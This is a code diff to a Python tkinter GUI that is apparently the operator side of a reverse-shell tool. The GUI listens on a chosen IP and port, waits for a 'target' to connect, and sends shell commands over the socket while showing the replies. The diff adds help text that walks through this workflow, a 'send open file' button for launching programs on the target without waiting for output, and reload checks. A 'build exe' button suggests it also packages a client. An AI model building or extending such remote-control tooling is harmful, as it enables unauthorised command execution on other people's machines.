@@ -2,7 +2,7 @@ import socket
 import tkinter as tk
 from threading import Thread
 
-
+global ip_port,conn
 global default_Lip,default_Lport,Lip,Lport
 default_Lip = '127.0.0.1'
 default_Lport = 9999
@@ -65,25 +65,40 @@ def exe():
 
 def reload_button():
     global start_flag,con_flag,be_con,Lip,Lport
-    Lip=''
-    Lport=0
-    start_flag = 0
-    con_flag = 0
-    be_con = 0
-    reload_con = 'exit'+" && echo [+] Command Request Done!"
-    conn.send(reload_con.encode())
-    conn.close()
-    show_command.insert('end',"[X] Connect Close"+'\n')
-    show_command.insert('end','reload!\n')
-    show_command.see('end')
-
+    if (con_flag == 0):
+        show_command.insert('end',"[X] Not Need reload"+'\n')
+    else:
+        Lip=''
+        Lport=0
+        start_flag = 0
+        con_flag = 0
+        be_con = 0
+        reload_con = 'exit'+" && echo [+] Command Request Done!"
+        conn.send(reload_con.encode())
+        conn.close()
+        show_command.insert('end',"[X] Connect Close"+'\n')
+        show_command.insert('end','reload!\n')
+        show_command.see('end')
+    
 
 def build():
     show_command.insert('end','\n')
 
 def help_button():
-    show_help = "[+] Help:\n"
-    show_help += "[+] Can Type Command!"
+    show_help = "[+] Help:\n\n"
+    show_help += "[+] If shell will response somthing can use send command button.\n\n"
+    show_help += "[+] If shell will not response somthing ex:open file,call other shell\n"
+    show_help += "can use send open file button.\n\n"
+    show_help += "[!] If use send command button to open file will crash.\n\n"
+    show_help += "[+] Start step:\n\n"
+    show_help += "[+] 1.Click set button to set local host IP and Port\n\n"
+    show_help += "[+] 2.Click Start to use set IP and Port on mission\n"
+    show_help += "If not Set Lhost IP and Port will use Default IP and Port\n\n"
+    show_help += "[+] Default IP and Port is 127.0.0.1:9999\n\n"
+    show_help += "[+] Click Connect Button to waiting target connect\n\n"
+    show_help += "[+] If connect done, can type command and Send command\n\n"
+    show_help += "\n\n\n"
+    show_help += "Version: v1.0\n"
     show_command.insert('end',show_help + '\n')
     show_command.see('end')
         
@@ -143,16 +158,47 @@ def send_command_fuc():
             show_command.insert('end',"[X] Connect Close"+'\n')
             show_command.see('end')
             conn.close()
-        elif data == 'help'+" && echo [+] Command Request Done!":
-            show_command.insert('end',"exit to quit"+'\n')
+        elif data.split(' ')[0] == 'start':
+            conn.send(data.encode())
+            show_command.insert('end','send start!'+'\n')
             show_command.see('end')
         elif data != '':
             conn.send(data.encode())
+            
+#            conn.setblocking(False)
             show_command.insert('end',(conn.recv(4096).decode('big5'))+'\n')
             show_command.see('end')
+            
         elif data == ' && echo [+] Command Request Done!':
             show_command.insert('end',"pls enter"+'\n')
             show_command.see('end')
+            
+def send_command_openfile():
+    if start_flag == 0:
+        show_command.insert('end',"Need Start\n")
+    elif con_flag == 0:
+        show_command.insert('end',"Need Connect\n")
+    elif con_flag == 1:
+        show_something = enter_command.get()
+        show_command.insert('end','command send '+show_something+'\n')
+        data = show_something
+        if data == 'exit':
+            conn.send(data.encode())
+            show_command.insert('end',"[X] Connect Close"+'\n')
+            show_command.see('end')
+            conn.close()
+        elif data != '':
+            conn.send(data.encode())
+#            conn.setblocking(False)
+            show_command.insert('end','command send done!'+'\n')
+            show_command.see('end')
+            
+        elif data == '':
+            show_command.insert('end',"pls enter"+'\n')
+            show_command.see('end')
+
+    
+
 window = tk.Tk()
 window.geometry('800x500')
 window.configure(bg='#000000')
@@ -161,7 +207,7 @@ command_text = tk.Label(window,text="command:",font = ('Algerian',10),fg='#FFFFF
 enter_command = tk.Entry(window,show = None)
 enter_command.grid(row=1,column=1)
 enter_command.configure(bg='#303030',fg='#0af000')
-command_button = tk.Button(window,text='send',command=send_command_fuc,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
+command_button = tk.Button(window,text='send command',command=send_command_fuc,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
 command_button.grid(row=1,column=2)
 start_button = tk.Button(window,text='start',command=start,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
 start_button.grid(row=2,column=6)
@@ -190,4 +236,7 @@ reload_button = tk.Button(window,text="reload",command=reload_button,font = ('�
 reload_button.grid(row=3 ,column=6)
 build_exe = tk.Button(window,text="build exe",command=exe,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
 build_exe.grid(row=3 ,column=7)
+command_button = tk.Button(window,text='sned open file',command=send_command_openfile,font = ('微軟正黑體',10),fg='#0af000',bg='#303030')
+command_button.grid(row=2,column=2)
+
 window.mainloop()
